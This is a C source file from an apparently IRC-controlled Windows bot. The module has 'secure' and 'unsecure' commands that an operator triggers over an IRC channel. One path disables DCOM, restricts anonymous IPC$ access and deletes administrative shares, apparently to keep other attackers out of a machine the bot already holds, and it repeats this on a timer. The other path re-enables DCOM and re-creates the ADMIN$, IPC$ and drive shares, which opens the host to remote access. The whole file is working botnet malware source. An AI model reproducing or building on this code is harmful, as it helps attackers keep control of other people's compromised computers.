/*
DC

*/

#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../headers/externs.h"

// globals
#ifndef NO_SECSYSTEM
int secure_delay=120000;
#endif

NetShares ShareList[]={
		{"IPC$",NULL},
		{"ADMIN$",NULL},
		{"C$","C:\\"},
		{"D$","D:\\"}
};


DWORD WINAPI SecureThread(LPVOID param)
{
	SECURE secure = *((SECURE *)param);
	SECURE *secures = (SECURE *)param;
	secures->gotinfo = TRUE;

	if (secure.secure)
		SecureSystem(secure.sock, secure.chan, secure.notice, secure.silent);
	else
		UnSecureSystem(secure.sock, secure.chan, secure.notice, secure.silent);

	clearthread(secure.threadnum);

	ExitThread(0);
}

BOOL SecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	char sendbuf[IRCLINE];

	if (!noadvapi32) {
		HKEY hKey;
		if(fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey3, 0, KEY_READ|KEY_WRITE, &hKey) == ERROR_SUCCESS) {
			TCHAR szDataBuf[]="N";
			if(fRegSetValueEx(hKey, "EnableDCOM", NULL, REG_SZ, (LPBYTE)szDataBuf, strlen(szDataBuf)) != ERROR_SUCCESS)
				sprintf(sendbuf,"4<<12[SECURE]: Disable DCOM failed.4>>");
			else
				sprintf(sendbuf,"4<<12[SECURE]: DCOM disabled.4>>");
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"4<<12[SECURE]: Failed to open DCOM registry key.4>>");
		if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
		addlog(sendbuf);

		if (fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey4, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			DWORD dwData = 0x00000001;
			if (fRegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD)) != ERROR_SUCCESS)
				sprintf(sendbuf,"4<<12[SECURE]: Failed to restrict access to the IPC$ Share.4>>");
			else
				sprintf(sendbuf,"4<<12[SECURE]: Restricted access to the IPC$ Share.4>>");
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"4<<12[SECURE]: Failed to open IPC$ Restriction registry key.4>>");
	} else
		sprintf(sendbuf,"4<<12[SECURE]: Advapi32.dll couldn't be loaded.4>>");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
	addlog(sendbuf);

	if (!nonetapi32) {
		PSHARE_INFO_502 pBuf,p;
		NET_API_STATUS nStatus;
		DWORD entriesread=0,totalread=0,resume=0;

		do {
			nStatus = fNetShareEnum(NULL, 502, (LPBYTE *) &pBuf, -1, &entriesread, &totalread, &resume);

			if(nStatus == ERROR_SUCCESS || nStatus == ERROR_MORE_DATA) {
				p = pBuf;

				for(unsigned int i=1;i <= entriesread;i++) {
					if (p->shi502_netname[wcslen(p->shi502_netname)-1] == '$') {
						if(ShareDel(NULL,AsAnsiString(p->shi502_netname)) == NERR_Success)
							_snprintf(sendbuf,sizeof(sendbuf),"nzm (secure.plg) »»  Share '%S' deleted.",p->shi502_netname);
						else
							_snprintf(sendbuf,sizeof(sendbuf),"nzm (secure.plg) »»  Failed to delete '%S' share.",p->shi502_netname);
						if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
						addlog(sendbuf);
					}

					p++;
				}

				fNetApiBufferFree(pBuf);
			} else {
				for(int i=0;i < (sizeof(ShareList) / sizeof (NetShares));i++) {
					if(ShareDel(NULL,ShareList[i].ShareName) == NERR_Success)
						_snprintf(sendbuf,sizeof(sendbuf),"4<<12[SECURE]: Share '%S' deleted.4>>",ShareList[i].ShareName);
					else
						_snprintf(sendbuf,sizeof(sendbuf),"4<<12[SECURE]: Failed to delete '%S' share.4>>",ShareList[i].ShareName);
					if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
					addlog(sendbuf);
				}
			}
		} while (nStatus == ERROR_MORE_DATA);
		sprintf(sendbuf,"4<<12[SECURE]: Network shares deleted.4>>");
	} else
		sprintf(sendbuf,"4<<12[SECURE]: Netapi32.dll couldn't be loaded.4>>");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice);
	addlog(sendbuf);

	return TRUE;
}

BOOL UnSecureSystem(SOCKET sock, char *chan, BOOL notice, BOOL silent)
{
	char sendbuf[IRCLINE];

	if (!noadvapi32) {
		HKEY hKey;
		if(fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey3, 0, KEY_READ|KEY_WRITE, &hKey) == ERROR_SUCCESS) {
			TCHAR szDataBuf[]="Y";
			if(fRegSetValueEx(hKey, "EnableDCOM", NULL, REG_SZ, (LPBYTE)szDataBuf, strlen(szDataBuf)) != ERROR_SUCCESS)
				sprintf(sendbuf,"4<<12[SECURE]: Enable DCOM failed.4>>");
			else
				sprintf(sendbuf,"4<<12[SECURE]: DCOM enabled.4>>");
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"4<<12[SECURE]: Failed to open DCOM registry key.4>>");
		if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
		addlog(sendbuf);

		if (fRegOpenKeyEx(HKEY_LOCAL_MACHINE, regkey4, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
			DWORD dwData = 0x00000000;
			if (fRegSetValueEx(hKey, "restrictanonymous", 0, REG_DWORD, (LPBYTE) &dwData, sizeof(DWORD)) != ERROR_SUCCESS)
				sprintf(sendbuf,"4<<12[SECURE]: Failed to unrestrict access to the IPC$ Share.4>>");
			else
				sprintf(sendbuf,"4<<12[SECURE]: Unrestricted access to the IPC$ Share.4>>");
			fRegCloseKey(hKey);
		} else
			sprintf(sendbuf,"4<<12[SECURE]: Failed to open IPC$ restriction registry key.4>>");
	} else
		sprintf(sendbuf,"4<<12[SECURE]: Advapi32.dll couldn't be loaded.4>>");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice, TRUE);
	addlog(sendbuf);

	if (!nonetapi32) {
		for(int i=0;i < ((sizeof(ShareList) / sizeof (NetShares)) - 2);i++) {
			if(ShareAdd(NULL,ShareList[i].ShareName,ShareList[i].SharePath) == NERR_Success)
				_snprintf(sendbuf,sizeof(sendbuf),"4<<12[SECURE]: Share '%s' added.4>>",ShareList[i].ShareName);
			else
				_snprintf(sendbuf,sizeof(sendbuf),"4<<12[SECURE]: Failed to add '%s' share.4>>",ShareList[i].ShareName);
			if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
			addlog(sendbuf);
		}

		char sharename[10], sharepath[10];
		DWORD dwDrives = GetLogicalDrives();
		for(char cDrive='A'; dwDrives!=0; cDrive++, dwDrives=(dwDrives>>1)) {
			if((dwDrives & 1)==1 && cDrive != 'A') {
				_snprintf(sharename,sizeof(sharename),"%c$",cDrive);
				_snprintf(sharepath,sizeof(sharepath),"%c:\\",cDrive);

				if (fGetDriveType(sharepath) == DRIVE_FIXED) {
					if(ShareAdd(NULL,sharename,sharepath) == NERR_Success)
						_snprintf(sendbuf,sizeof(sendbuf),"4<<12[SECURE]: Share '%s' added.4>>",sharename);
					else
						_snprintf(sendbuf,sizeof(sendbuf),"4<<12[SECURE]: Failed to add '%s' share.4>>",sharename);
					if (!silent) irc_privmsg(sock,chan,sendbuf,notice, TRUE);
					addlog(sendbuf);
				}
			}
		}

		sprintf(sendbuf,"4<<12[SECURE]: Network shares added.4>>");
	} else
		sprintf(sendbuf,"4<<12[SECURE]: Netapi32.dll couldn't be loaded.4>>");
	if (!silent) irc_privmsg(sock,chan, sendbuf, notice);
	addlog(sendbuf);

	return TRUE;
}

#ifndef NO_SECSYSTEM
DWORD WINAPI AutoSecure(LPVOID param)
{
	while (1) {
		SecureSystem(0,NULL,FALSE,TRUE);
		Sleep(secure_delay);
	}
	ExitThread (0);
}
#endif
